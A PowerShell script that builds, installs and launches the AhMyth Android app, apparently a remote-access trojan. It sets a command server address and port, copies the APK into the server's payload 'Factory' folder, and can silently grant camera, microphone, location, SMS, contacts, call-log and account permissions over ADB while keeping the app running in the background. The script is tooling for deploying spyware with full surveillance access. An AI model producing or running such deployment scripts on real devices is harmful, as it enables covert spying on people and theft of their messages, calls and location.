# AhMyth APK Build and Run Script
# Builds release APK with all features, installs on emulator, and runs
# Usage: .\build-and-run.ps1
# Usage with bun: bun run build

param(
    [switch]$SkipBuild,
    [switch]$GrantPermissions,
    [string]$ServerIP = "10.0.2.2",
    [int]$ServerPort = 1234
)

# Colors for output
function Write-Success { param($msg) Write-Host "[OK] $msg" -ForegroundColor Green }
function Write-Info { param($msg) Write-Host "[->] $msg" -ForegroundColor Cyan }
function Write-Warn { param($msg) Write-Host "[!!] $msg" -ForegroundColor Yellow }
function Write-Fail { param($msg) Write-Host "[XX] $msg" -ForegroundColor Red }

# Setup paths
$env:Path = "$env:LOCALAPPDATA\Android\Sdk\platform-tools;$env:LOCALAPPDATA\Android\Sdk\build-tools\34.0.0;$env:Path"
$PackageName = "ahmyth.mine.king.ahmyth"
$ApkPath = "app\build\outputs\apk\release\app-release.apk"
$OutputDir = "..\AhMyth-Server\app\Factory\Output"

Write-Host ""
Write-Host "================================================================" -ForegroundColor Magenta
Write-Host "           AhMyth APK Builder and Installer                     " -ForegroundColor Magenta
Write-Host "================================================================" -ForegroundColor Magenta
Write-Host ""

# Check ADB
Write-Info "Checking ADB connection..."
$devices = adb devices 2>&1 | Select-String -Pattern "device$"
if (-not $devices) {
    Write-Fail "No device/emulator connected. Please start an emulator or connect a device."
    exit 1
}
Write-Success "Device connected"

# Build APK
if (-not $SkipBuild) {
    Write-Host ""
    Write-Info "Building Release APK with all features..."
    Write-Host "   Server: ${ServerIP}:${ServerPort}" -ForegroundColor Gray
    
    # Clean and build - redirect stderr to stdout
    cmd /c ".\gradlew.bat clean assembleRelease --warning-mode=none 2>&1" | Out-Null
    
    # Check APK exists
    if (-not (Test-Path $ApkPath)) {
        Write-Fail "Build failed - APK not found at $ApkPath"
        Write-Info "Trying debug build instead..."
        cmd /c ".\gradlew.bat assembleDebug --warning-mode=none 2>&1" | Out-Null
        $ApkPath = "app\build\outputs\apk\debug\app-debug.apk"
        if (-not (Test-Path $ApkPath)) {
            Write-Fail "Debug build also failed"
            exit 1
        }
    }
    
    Write-Success "APK built successfully"
    
    $apkSize = [math]::Round((Get-Item $ApkPath).Length / 1MB, 2)
    Write-Host "   APK Size: $apkSize MB" -ForegroundColor Gray
    
    # Copy to output folder
    if (-not (Test-Path $OutputDir)) {
        New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null
    }
    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $destPath = "$OutputDir\ahmyth_$timestamp.apk"
    Copy-Item $ApkPath $destPath
    Write-Success "APK copied to: $destPath"
} else {
    Write-Warn "Skipping build (using existing APK)"
    if (-not (Test-Path $ApkPath)) {
        $ApkPath = "app\build\outputs\apk\debug\app-debug.apk"
    }
}

# Uninstall old version
Write-Host ""
Write-Info "Uninstalling previous version (if exists)..."
adb uninstall $PackageName 2>&1 | Out-Null
Write-Success "Old version removed"

# Install APK
Write-Info "Installing APK..."
$installResult = adb install -r $ApkPath 2>&1
if ($installResult -match "Success") {
    Write-Success "APK installed successfully"
} else {
    Write-Fail "Installation failed: $installResult"
    exit 1
}

# Grant permissions if requested
if ($GrantPermissions) {
    Write-Host ""
    Write-Info "Granting all permissions via ADB..."
    
    $permissions = @(
        "android.permission.CAMERA",
        "android.permission.RECORD_AUDIO",
        "android.permission.READ_EXTERNAL_STORAGE",
        "android.permission.WRITE_EXTERNAL_STORAGE",
        "android.permission.ACCESS_FINE_LOCATION",
        "android.permission.ACCESS_COARSE_LOCATION",
        "android.permission.READ_CONTACTS",
        "android.permission.READ_SMS",
        "android.permission.SEND_SMS",
        "android.permission.RECEIVE_SMS",
        "android.permission.READ_CALL_LOG",
        "android.permission.READ_PHONE_STATE",
        "android.permission.CALL_PHONE",
        "android.permission.GET_ACCOUNTS",
        "android.permission.ACCESS_WIFI_STATE",
        "android.permission.CHANGE_WIFI_STATE",
        "android.permission.ACCESS_BACKGROUND_LOCATION",
        "android.permission.POST_NOTIFICATIONS"
    )
    
    foreach ($perm in $permissions) {
        adb shell pm grant $PackageName $perm 2>&1 | Out-Null
    }
    
    # Special permissions
    adb shell appops set $PackageName REQUEST_IGNORE_BATTERY_OPTIMIZATIONS allow 2>&1 | Out-Null
    adb shell appops set $PackageName RUN_IN_BACKGROUND allow 2>&1 | Out-Null
    adb shell appops set $PackageName RUN_ANY_IN_BACKGROUND allow 2>&1 | Out-Null
    
    Write-Success "All permissions granted"
} else {
    Write-Host ""
    Write-Warn "Permissions will be requested via dialogs on the device"
    Write-Host "   (Use -GrantPermissions flag to auto-grant via ADB)" -ForegroundColor Gray
}

# Launch app
Write-Host ""
Write-Info "Launching app..."
adb shell am start -n "$PackageName/.MainActivity" 2>&1 | Out-Null
Write-Success "App launched"

# Wait and verify
Start-Sleep -Seconds 2
$appPid = adb shell pidof $PackageName 2>&1
if ($appPid -match "^\d+$") {
    Write-Success "App is running (PID: $appPid)"
} else {
    Write-Warn "Could not verify app is running"
}

# Summary
Write-Host ""
Write-Host "================================================================" -ForegroundColor Green
Write-Host "                    Build Complete!                             " -ForegroundColor Green
Write-Host "================================================================" -ForegroundColor Green
Write-Host ""
Write-Host "  Package:  $PackageName" -ForegroundColor White
Write-Host "  Server:   ${ServerIP}:${ServerPort}" -ForegroundColor White
Write-Host "  APK:      $ApkPath" -ForegroundColor White
if (-not $GrantPermissions) {
    Write-Host ""
    Write-Host "  >> Check the device for permission dialogs! <<" -ForegroundColor Yellow
}
Write-Host ""
